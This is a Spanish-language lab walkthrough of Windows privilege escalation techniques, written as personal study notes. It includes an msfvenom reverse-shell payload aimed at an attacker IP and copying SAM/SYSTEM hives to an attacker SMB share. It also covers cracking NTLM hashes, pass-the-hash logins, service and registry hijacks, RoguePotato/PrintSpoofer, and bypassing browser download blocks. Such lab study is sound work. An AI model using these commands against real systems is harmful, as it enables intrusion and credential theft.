Comenzamos conectandonos a la maquina por xfreerdp
![[Pasted image 20240718133955.png]]

Una vez dentro para generarnos la reverse shell tenemos que enviar un paylaod a la maquina victima, primero lo creamos con msfvenom
![[Pasted image 20240718132329.png]]

Y lo importamos por un modulo llamado `smbserver` 
```Bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
![[Pasted image 20240718134203.png]]

En la maquina victima nos descargamos el fichero con el sigueinte comando
```
copy \\10.9.0.184\kali\reverse.exe reverse.exe
```
![[Pasted image 20240718134226.png]]
![[Pasted image 20240718134314.png]]

Una vez descargado nos ponemos en escucha con netcat y nos generamos la reverse shell
![[Pasted image 20240718134918.png]]


# **Service Exploits - Insecure Service Permissions**
Ahora utilizaremos la herramienta `accesschk.exe` de sysinternal para revisar los permisos del usuario `user` en el servicio `daclsvc`
```
`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
```
![[Pasted image 20240718140021.png]]
- **C:\PrivEsc\accesschk.exe**: Es la ruta completa del ejecutable `accesschk.exe`. Este programa es una herramienta de línea de comandos desarrollada por Sysinternals (ahora parte de Microsoft) que se utiliza para verificar los permisos de acceso a objetos del sistema, como archivos, directorios, claves de registro, etc.
- **/accepteula**: Es un parámetro que indica que el usuario acepta el acuerdo de licencia de usuario final (EULA, End User License Agreement) de Sysinternals automáticamente sin necesidad de confirmación manual.
- **-uwcqv**: Estos son los parámetros que se pasan al programa `accesschk.exe`, y tienen los siguientes significados:
    - **-u**: Muestra la lista de usuarios que tienen acceso al objeto especificado.
    - **-w**: Muestra los permisos de escritura (Write) para el usuario especificado (`user` en este caso).
    - **-c**: Muestra el Control Total (Full Control) para el usuario especificado.
    - **-q**: No muestra mensajes de encabezado en la salida del comando (Quiet mode, modo silencioso).
    - **-v**: Muestra información detallada (Verbose mode, modo detallado).
- **user**: Es el nombre del usuario para el cual se están consultando los permisos de acceso en el objeto especificado por el siguiente parámetro.
- **daclsvc**: Es el nombre del objeto (archivo, directorio, etc.) para el cual se están verificando los permisos de acceso para el usuario especificado (`user`).

Consultamos el estado de `daclsvc`
```
sc qc daclsvc
```
![[Pasted image 20240718135939.png]]

Configuramos el servicio para que ejecute nuestra reverse shell
```
`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`
```
![[Pasted image 20240718140435.png]]

Ahora cerramos la conexión que teniamos y volvemos a ponernos a la escucha con netcat y con la conexión que tenemos de xfreerdp levantamos el servicio
```
net start daclsvc
```
![[Pasted image 20240718140738.png]]

Y ya habremos escalado los privilegios
![[Pasted image 20240718140812.png]]

# **Service Exploits - Unquoted Service Path**
Revisamos el servicio `unquotedsvc` y encontramos que se ejecuta con privilegios de system y el binario no esta entre comillas
![[Pasted image 20240719081115.png]]

Revisamos con `accesschk.exe` los permisos y encontramos que podemos editar con el usuario user
```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
![[Pasted image 20240719081526.png]]

Copiamos nuestro payload en el servicio para que ejecute nuestro binario omitiendo el del sistema
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
![[Pasted image 20240719081631.png]]

Ahora cerramos la conexión y nos volvemos a poner en escucha con netcat y desde la conexión con xfreerdp iniciamos el servicio
```
net start unquotedsvc
```
![[Pasted image 20240719081749.png]]
![[Pasted image 20240719081804.png]]

# **Service Exploits - Weak Registry Permissions**
Ahora revisamos el registro `regsvc`
```
sc qc regsvc
```
![[Pasted image 20240719081957.png]]

Volvemos a utilizar `accesschk.exe` para listar los permisos del registro
```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```
![[Pasted image 20240719084003.png]]

Modificamos el registro para que ejecute nuestro payload
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
![[Pasted image 20240719083935.png]]
- **`reg add`**:
    - Esta es la operación principal del comando y se utiliza para agregar una nueva entrada al registro de Windows o modificar una existente.
- **`HKLM\SYSTEM\CurrentControlSet\services\regsvc`**:
    - Esta es la ruta dentro del registro de Windows donde se realizará la modificación o adición. En particular, `HKLM` (HKEY_LOCAL_MACHINE) almacena configuraciones que son específicas del equipo y afectan a todos los usuarios.
    - `SYSTEM\CurrentControlSet\services` es donde Windows almacena la configuración relacionada con los servicios del sistema.
    - `regsvc` es el nombre de un servicio específico en el sistema, y esta entrada del registro contiene la configuración para ese servicio.
- **`/v ImagePath`**:
    - Este parámetro especifica el nombre del valor que se va a agregar o modificar dentro de la clave del registro especificada. `ImagePath` es un valor común en las claves de servicio que indica la ruta del ejecutable que se inicia como parte del servicio.
- **`/t REG_EXPAND_SZ`**:
    - Esto indica el tipo de datos del valor del registro. `REG_EXPAND_SZ` es un tipo de dato de cadena que puede contener variables expandibles de entorno (como `%SystemRoot%`), que se expanden a su valor real cuando el sistema o el servicio las utiliza.
- **`/d C:\PrivEsc\reverse.exe`**:
    - El parámetro `/d` especifica los datos que se asignarán al valor del registro. En este caso, se está estableciendo que el servicio `regsvc` deberá ejecutar el archivo `C:\PrivEsc\reverse.exe`.
- **`/f`**:
    - Este es un switch para forzar la sobreescritura del valor sin pedir confirmación al usuario. Esto es útil en scripts automatizados para evitar interrupciones que requieran interacción del usuario.

Volvemos a cerrar la conexión de netcat y nos ponemos en escucha ante de levantar el servicio
![[Pasted image 20240719084201.png]]
![[Pasted image 20240719084226.png]]

# **Service Exploits - Insecure Service Executables**
Ahora revisamos los permisos de`filepermsvc`
![[Pasted image 20240719090759.png]]

Usamos `accessschk` para revisar los permisos del servicio
```
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
![[Pasted image 20240719090938.png]]

Revisamos y tenemos permiso para modificar el servicio así que copiamos nuestro payload y lo reemplazamos
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```
![[Pasted image 20240719095124.png]]

Ahora cerramos la conexión de netcat y nos volvemos a poner en escucha y con la conexión de xfreerdp levantamos el servicio
![[Pasted image 20240719095307.png]]
![[Pasted image 20240719095325.png]]

# **Registry - AutoRuns**
Ahora vamos a revisar los programas que se ejecutan al iniciar windows, como podemos ver en la captura hay un programa de inicio
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
![[Pasted image 20240722074230.png]]

Con accesschk revisamos los permisos y encontramos que tenemos permisos de escritura
```
`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
```
![[Pasted image 20240722074520.png]]

También podemos revisarlo con el siguiente comando
```
Get-Acl "C:\Program Files\Autorun Program\program.exe" | Format-List
```
![[Pasted image 20240722074748.png]]

Ahora ejecutamos el siguiente comando para sobreescribir el binario que se ejecute
```
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`
```
![[Pasted image 20240722075129.png]]

Ahora nos ponemos en escucha con netcat y reiniciamos la maquina, al reiniciarse deberiamos obtener la reverse shell como `Admin`, en caso de que no se genere podemos acceder por `rdesktop` ya que deberemos iniciar sesion como admin para activar los programas y una vez activado obtenemos la reverse shell
```
rdekstop 10.10.13.194
```
![[Pasted image 20240722075700.png]]

Y ya somos admin
![[Pasted image 20240722075750.png]]

# **Registry - AlwaysInstallElevated**
Ahora vamos a revisar los permisos de los registro de windows tanto para `HKCU` (HKEY_CURRENT_USER) como para `HKLM` (HKEY_LOCAL_MACHINE), si en la salida del comando muestra 1 o (0x1) siginifica que cualquier instalación de software MSI se instalara con privilegios de Administrador
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
![[Pasted image 20240722081905.png]]

Así que crearemos un payload con msfvenom que sea un ejecutable msi
```
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.0.184 LPORT=4433 -f msi -o reverse.msi`
```
![[Pasted image 20240722082238.png]]

Lo transferimos a la maquina victima
![[Pasted image 20240722082403.png]]

Y ahora nos ponemos en escucha con netcat y ejecutamos el instalador
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```
![[Pasted image 20240722082550.png]]

Y habremos obtenido la reverse shell como `System`
![[Pasted image 20240722082617.png]]

# **Passwords - Registry** 
Podemos buscar contraseñas dentro de los registros de windows, para ello ejecutaremos el siguiente comando
```
reg query HKLM /f password /t REG_SZ /s
```
![[Pasted image 20240722083129.png]]
- `reg query HKLM`: Este es el comando básico para consultar dentro de la sección HKEY_LOCAL_MACHINE del Registro, que afecta a todos los usuarios y servicios en la máquina.
- `/f password`: La opción `/f` seguida de "password" especifica el filtro de la búsqueda, es decir, buscar cualquier cosa que contenga "password".
- `/t REG_SZ`: La opción `/t` seguida de `REG_SZ` filtra la búsqueda para que solo devuelva entradas que sean cadenas (strings). `REG_SZ` es un tipo de dato en el Registro que representa strings.
- `/s`: La opción `/s` indica que la búsqueda debe ser recursiva, incluyendo todas las subclaves bajo la clave especificada.

También podemos buscar un registro en concreto dentro del sistema como `winlogon` la cual contiene configuraciones y las credenciales de incio de sesión de windows, no siempre las almacena, como podemos ver en este caso no las ha mostrado
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```
![[Pasted image 20240722083512.png]]
1. **DefaultDomainName [REG_SZ]**:
    - Este valor de cadena, si está establecido, especifica el dominio predeterminado que se muestra en la pantalla de inicio de sesión. En tu salida, este valor está vacío, lo que indica que no se preestablece un dominio específico para los inicios de sesión.
2. **DefaultUserName [REG_SZ]**:
    - Similar al anterior, este valor almacena el nombre de usuario que aparece por defecto en la pantalla de inicio de sesión. También está vacío en tu salida, lo que significa que no hay un usuario predeterminado configurado.
3. **EnableSIHostIntegration [REG_DWORD]**:
    - Valor que indica si la integración del host del sistema (System Integration Host) está habilitada (1) o deshabilitada (0). En tu caso, está habilitado (0x1), lo que significa que esta integración está activa.
4. **PreCreateKnownFolders [REG_SZ]**:
    - Contiene un identificador GUID (`{A520A1A4-1780-4FF6-BD18-167343C5AF16}`). Este valor es utilizado por Windows para precrear carpetas conocidas antes de que el usuario inicie sesión, lo que puede ayudar a acelerar el proceso de inicio de sesión.
5. **Shell [REG_SZ]**:
    - Define el programa que se ejecuta justo después del inicio de sesión del usuario, que en la mayoría de los sistemas Windows es `explorer.exe`. Este es el entorno de escritorio que proporciona la interfaz gráfica.
6. **ShellCritical [REG_DWORD]**:
    - Este valor booleano determina si el proceso del shell es crítico para el sistema. Un valor de `0x0` indica que no es crítico, lo que significa que un fallo en el shell no provocará un fallo del sistema.
7. **SiHostCritical [REG_DWORD]**:
    - Determina si el System Integration Host es crítico para el sistema. Un `0x0` indica que no es crítico.
8. **SiHostReadyTimeOut [REG_DWORD]**:
    - Tiempo de espera, en milisegundos, antes de que se considere que sihost.exe está listo. Un valor de `0x0` sugiere que no hay un tiempo de espera configurado o que es inmediato.
9. **SiHostRestartCountLimit [REG_DWORD]**:
    - Número máximo de veces que sihost.exe puede reiniciarse si falla. Un valor de `0x0` indica que no hay límite o que el reinicio está deshabilitado.
10. **SiHostRestartTimeGap [REG_DWORD]**:
    - Intervalo de tiempo mínimo, en milisegundos, entre reinicios de sihost.exe. Un `0x0` sugiere que no hay intervalo de tiempo configurado entre los reinicios.
### Subclaves Adicionales
- **AlternateShells**:
    - Esta subclave puede contener información sobre shells alternativos que se pueden utilizar en lugar de `explorer.exe`. Esto es útil en entornos donde se requiere un shell diferente para propósitos específicos o limitados.
- **GPExtensions**:
    - Contiene extensiones relacionadas con la Política de Grupo (Group Policy). Estas extensiones permiten a Windows manejar cómo las políticas son aplicadas y extendidas a través del sistema, proporcionando funcionalidades adicionales o modificando las existentes durante la aplicación de políticas.


En el caso de que hubiese mostrado las credenciales ahora ejecutaríamos `winexe` para acceder como admin
```
winexe -U 'admin%password' //10.10.13.194 cmd.exe
```
![[Pasted image 20240722084755.png]]

# **Passwords - Saved Creds**
Con el siguiente comando podemos revisar todas las credenciales almacenadas en el Administrador de Credenciales de Windows
```
cmdkey /list
```
![[Pasted image 20240722093150.png]]
- **Primera Entrada: Credenciales Genéricas**
    - **Target**: `WindowsLive:target=virtualapp/didlogical` - Indica que estas credenciales están asociadas con un servicio de Windows Live. El término `virtualapp/didlogical` podría estar relacionado con aplicaciones virtuales o un identificador interno de Microsoft.
    - **Type**: `Generic` - Este tipo se refiere a credenciales que no están directamente vinculadas a un dominio específico y se utilizan para propósitos generales.
    - **User**: `02nfpgrklkitqatu` - Este parece ser un identificador de usuario o token generado, posiblemente usado para la autenticación con un servicio específico de Microsoft.
    - **Local machine persistence** - Las credenciales están almacenadas de forma que sólo persisten en la máquina local, no siendo transferibles ni accesibles desde otras máquinas en una red.
- **Segunda Entrada: Credenciales de Dominio**
    - **Target**: `Domain:interactive=WIN-QBA94KB3IOF\admin` - Esta entrada indica que las credenciales son para una cuenta de dominio en la máquina `WIN-QBA94KB3IOF`, y el usuario es `admin`. La parte `interactive` sugiere que estas credenciales se utilizan para sesiones de inicio de sesión interactivo.
    - **Type**: `Domain Password` - Especifica que estas son credenciales para una contraseña de dominio, utilizadas para autenticación en entornos de red de dominio.
    - **User**: `WIN-QBA94KB3IOF\admin` - Muestra el dominio y el nombre de usuario asociados con estas credenciales, en este caso, el usuario administrador del dominio/local máquina especificada.

Ahora nos ponemos a la escucha con netcat y ejecutamos el siguiente comando para ejecutar nuestro paylaod con permisos de administrador y las credenciales almacenadas
```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```
![[Pasted image 20240722093738.png]]
- **`/savecred`**: Esta opción permite al comando `runas` utilizar credenciales previamente guardadas que el usuario actual haya almacenado usando `cmdkey`. Esto evita que se pida la contraseña nuevamente si ya fue ingresada y guardada anteriormente.
- **`/user:admin`**: Especifica que el comando o programa deberá ejecutarse con los privilegios del usuario `admin`.
- **`C:\PrivEsc\reverse.exe`**: Es el programa que será ejecutado con los privilegios elevados. `reverse.exe` podría ser cualquier ejecutable, en este contexto parece ser un programa que probablemente forma parte de un test o de una herramienta de seguridad.

Y ya hemos obtenido la shell como admin
![[Pasted image 20240722093802.png]]


# **Passwords - Security Account Manager (SAM)**
Podemos sacar los hashes de los archivos SAM y System, para ello los descargaremos del sistema, para ello levantaremos un servidor de SAMBA en nuestra maquina de kali linux
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
![[Pasted image 20240722094410.png]]

Y los copiaremos en nuestro sistema
```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```
![[Pasted image 20240722094604.png]]

Si volvemos al servidor veremos los registros de los ficheros descargados
![[Pasted image 20240722094703.png]]

Y ya tendremos los archivos en nuestro sisetma
![[Pasted image 20240722094738.png]]

Ahora para descubrir los hashes podemos usar una herramienta llamada [[Creddump7]]
Ahora ejecutamos el siguiente comando y habremos obtenido los hashes NTLM del sistema
```
python3 creddump7/pwdump.py SYSTEM SAM
```
![[Pasted image 20240722095822.png]]

Ahora copiaremos todas las credenciales en un .txt y las crackearemos con hashcat o john the ripper![[Pasted image 20240722095942.png]]

Y ahora la crackeamos con Hascat
```
hashcat -m 1000 --force hash.txt /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240722100225.png]]
![[Pasted image 20240722100258.png]]

Ahora podemos volver a listar la salida de hashcat con el siguiente comando
```
hashcat -m 1000 --show hash.txt
```
![[Pasted image 20240722101519.png]]

Tambien podemos usar john the ripper
```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![[Pasted image 20240722101320.png]]

Ahora podriamos acceder por rdp con las credenciales obtenidas
```
winexe -U 'admin%password123' //10.10.169.134 cmd.exe
```
![[Pasted image 20240722101759.png]]

# **Passwords - Passing the Hash**
También podemos acceder utilizando el hash completo
```
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.32.61 cmd.exe
```
![[Pasted image 20240722122040.png]]

# **Scheduled Tasks**
Vamos a revisar el siguiente script el cual indica que cada minuto borra los logs de una carpeta
```
type C:\DevTools\CleanUp.ps1
```
![[Pasted image 20240722122751.png]]

Revisamos los permisos del script y encontramos que podemos modificarlo
```
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```
![[Pasted image 20240722123312.png]]
- `/accepteula`: Esta opción suprime la pantalla de aceptación del acuerdo de licencia que normalmente se mostraría al ejecutar herramientas de Sysinternals por primera vez.
- `-quvw`: Son opciones combinadas que modifican el comportamiento de `accesschk`:
    - `-q`: Modo silencioso (quiet), reduce la cantidad de salida para facilitar la lectura.
    - `-u`: Muestra los permisos explícitamente otorgados al usuario.
    - `-v`: Modo verboso, proporciona información detallada.
    - `-w`: Muestra solo los objetos que tienen permiso de escritura.
- `user`: Especifica el nombre del usuario o del grupo cuyos permisos se están comprobando.

Ahora nos ponemos en escucha con netcat y añadimos nuestro payload al script
```
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```
![[Pasted image 20240722123755.png]]

Y ahora estando en escucha con netcat esperaremos a que se ejecute la tarea para obtener la reverese shell como System
![[Pasted image 20240722123837.png]]

# **Insecure GUI Apps**
Ahora estamos conectados por RDP y tenemos abierta la herramienta de paint con el usuario user y podemos ver que se ha ejecutado como admin
![[Pasted image 20240722124402.png]]

Ahora abrimos el paint y seleccionamos archivo y abrir
![[Pasted image 20240722124721.png]]

Y ahora pegamos la ruta para que nos abra el cmd
```
c:/windows/system32/cmd.exe
```
![[Pasted image 20240722124754.png]]

Y al abrirlos se nos abrirar el terminal como si fueramos admin
![[Pasted image 20240722124835.png]]

# **Startup Apps**
Revisamos los permisos del directorio de `StartUp` que es la carpeta la cual se colocan los programas y scripts que se ejecutan automáticamente cuando se inicia sesión en el sistema
```
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
![[Pasted image 20240722132529.png]]

Ahora crearemos un acceso directo de nuestro paylaod con el siguiente script de powershell
```Powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk")
$Shortcut.TargetPath = "C:\PrivEsc\reverse.exe"
$Shortcut.Save()
```
![[Pasted image 20240722134035.png]]

Si vamos a la ruta podemos ver que ya tenemos el acceso directo creado
![[Pasted image 20240722134133.png]]

Ahora nos ponemos en esuchca con netcat y tendremos que inidicar una conexión por RDP
![[Pasted image 20240722134334.png]]

Ahora una vez hayamos iniciado sesión y el sistema haya ejecutado los programa de inicio se ejecutara nuestro paylaod y obtendremos nuestra reverse shell como admin
![[Pasted image 20240722134455.png]]

# **Token Impersonation - Rogue Potato**
```
https://github.com/antonioCoco/RoguePotato
```

Comenzamos desde RDP con permisos del usuario `admin`
![[Pasted image 20240723090736.png]]

Ahora nos generamos una reverse shell como `nt authority\local`
```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```
![[Pasted image 20240723080446.png]]
![[Pasted image 20240723090847.png]]

Ahora ejecutamos el siguiente comando de socat para redireccionar el trafico del puerto 135 el cual es por el que tenemos que escuchar para este ataque y lo redirige por el puerto 9999. Esto simula el tráfico DCOM/RPC en el puerto 135 y lo redirige al puerto 9999
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.123.207:9999
```
![[Pasted image 20240723090937.png]]

Y ahora volvemos a ponernos a la escucha con netcat y ejecutando la herramienta de `roguepotato` obtenemos el token de `System` en la otra reverse shell.
Rogue Potato se conecta a la IP 10.9.0.184 (en el puerto que normalmente sería 135, pero debido a `socat`, se redirige al puerto 9999) y utiliza esa conexión para ejecutar `reverse.exe` en el sistema comprometido con privilegios elevados
```
C:\PrivEsc\RoguePotato.exe -r 10.9.0.184 -e "C:\PrivEsc\reverse.exe" -l 9999
```
![[Pasted image 20240723091018.png]]
![[Pasted image 20240724093838.png]]
![[Pasted image 20240723092743.png]]

Si revisamos socat podemos ver la conexión como la ha detectado
![[Pasted image 20240724093955.png]]

Estos son los dos procesos importantes antes de ejecutar `roguepotato` para poder escalar los privilegios
![[Pasted image 20240723091518.png]]
- **SeImpersonatePrivilege**: Este permiso permite a un proceso suplantar la identidad de otro proceso. Es fundamental para muchas técnicas de escalada de privilegios, ya que permite que un proceso menos privilegiado actúe como otro con mayores privilegios. En el contexto de esta tarea, es utilizado por `RoguePotato` para obtener el token SYSTEM.
- **SeAssignPrimaryTokenPrivilege**: Este privilegio permite a un proceso reemplazar el token de seguridad de un proceso. Es importante para la creación de procesos con credenciales diferentes a las originales del proceso que los inicia. En la tarea, después de obtener el token SYSTEM, este permiso es utilizado para lanzar `reverse.exe` con los privilegios elevados.

# **Token Impersonation - PrintSpoofer**
```
https://github.com/itm4n/PrintSpoofer
```

Ahora nos generamos una reverse shell como `nt authority\local`
```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```
![[Pasted image 20240723080446.png]]
![[Pasted image 20240723090847.png]]

Ahora nos volvemos a poner en escucha con netcat y ejecutamos el siguiente comando para obtener 
```
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```
![[Pasted image 20240723092015.png]]
`PrintSpoofer` utiliza el privilegio `SeImpersonatePrivilege` para suplantar al servicio de impresión de Windows, ejecutando un comando con privilegios elevados y proporcionando acceso completo a la máquina objetivo.

Y como vemos obtenemos acceso con todos los privilegios
![[Pasted image 20240723092258.png]]
![[Pasted image 20240723092349.png]]

# **Privilege Escalation Scripts**
```
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
https://github.com/GhostPack/Seatbelt
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
https://github.com/GhostPack/SharpUp
```



------
# **Permitir descargas bloqueadas**
Si accedemos al navegador de microsoft y al intentar descargar un payload conectándonos al servidor que hemos levantado en nuestra maquina y salta el siguiente mensaje
![[Pasted image 20240722092340.png]]

Tenemos que habilitar la confianza en nuestra ip, para ello vamos a configuración y a `opciones de internet`
![[Pasted image 20240722092533.png]]

Y tenemos que añadir la ip a sitios de confianza
![[Pasted image 20240722092624.png]]

Como vemos en la sigueinte imagen al volver a descargarlo nos vuelve a solciitar confirmación pero no nos bloquea el paylaod
![[Pasted image 20240722092803.png]]


# **Comandos permisos**
Podemos utilizar el siguiente comando en cmd
```
icacls "C:\Program Files\Unquoted Path Service"
```
![[Pasted image 20240719082657.png]]

Para versiones mas antiguas de Windows
```
cacls "C:\Program Files\Unquoted Path Service"
```

También podemos usar el siguiente comando desde cmd para revisar los permisos
```
Get-Acl "C:\Program Files\Unquoted Path Service\" | Format-List
```
![[Pasted image 20240719082521.png]]
![[Pasted image 20240719082544.png]]


